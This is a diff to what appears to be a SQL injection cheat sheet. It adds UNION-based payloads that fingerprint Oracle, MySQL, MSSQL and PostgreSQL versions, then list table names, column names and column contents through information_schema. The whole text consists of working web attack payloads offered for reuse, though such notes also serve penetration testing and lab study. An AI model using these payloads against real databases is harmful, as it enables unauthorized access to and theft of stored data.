@@ -12,7 +12,27 @@
 
 ' union select banner, null from v$version-- - >> Oracle
 
-' union select null, @@version-- - Mysql, MSsql
+' union select null, @@version-- - >> Mysql, MSsql
+
+' union select null, version()-- - >> PostgreSQL
+
+
+
+#To fetch table name
+
+' union SELECT table_name,null FROM information_schema.tables-- - >> PostgreSQL
+
+
+
+#To fetch column name
+
+SELECT column_name,null FROM information_schema.columns WHERE table_name='table name' >> PostgreSQL
+
+
+
+#To fetch information from columns
+
+' union select [column name here],null from [table name here]-- -
 
 
 
